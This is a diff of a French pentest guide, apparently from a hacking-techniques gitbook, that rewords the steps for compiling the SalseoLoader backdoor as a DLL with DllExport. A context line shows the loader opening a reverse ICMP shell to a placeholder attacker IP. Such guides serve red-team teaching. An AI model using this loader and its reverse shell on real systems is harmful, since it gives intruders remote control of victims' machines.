@@ -99,9 +99,9 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
-### Ajoutez avant la fonction principale: \[DllExport]
+### Ajoutez avant la fonction principale : \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Installez DllExport pour ce projet
 
@@ -115,9 +115,9 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 Dans le dossier de votre projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**
 
-### **Désinstallez DllExport**
+### **Désinstallez** DllExport
 
-Appuyez sur **Désinstaller** (oui, c'est étrange mais faites-moi confiance, c'est nécessaire)
+Appuyez sur **Désinstaller** (oui, c'est bizarre mais faites-moi confiance, c'est nécessaire)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
@@ -143,7 +143,7 @@ Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Proprié
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
+Sélectionnez **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Général --> Cible de la plateforme = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
